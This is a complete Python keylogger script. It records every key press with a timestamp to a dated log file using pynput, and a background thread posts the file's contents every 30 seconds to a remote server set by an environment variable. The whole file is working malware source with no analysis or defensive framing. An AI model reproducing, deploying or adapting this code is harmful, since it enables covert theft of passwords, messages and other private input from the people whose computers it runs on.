import logging, requests, threading, datetime, time, os
from pynput.keyboard import Listener
from dotenv import load_dotenv
load_dotenv()
logging.basicConfig(filename=(str(datetime.date.today()) + "-" + "keylogs.txt"), level=logging.DEBUG)

# save key presses
def on_press(key):
    text = str(datetime.datetime.now()) + ": " + str(key)
    logging.info(text)

# send keylogs file to remote server every 30 seconds
def log_to_server():
    while True:
        filename = str(datetime.date.today()) + "-" + "keylogs.txt"
        f = open(filename, "r")
        lines = f.readlines()
        requests.post(os.getenv("SERVER", "http://localhost:5000"), json={"data": lines})
        time.sleep(30)

# run log_to_server function on a thread
t1 = threading.Thread(target=log_to_server)
t1.start()

# listen for key presses
with Listener(on_press=on_press) as listener:
    listener.join()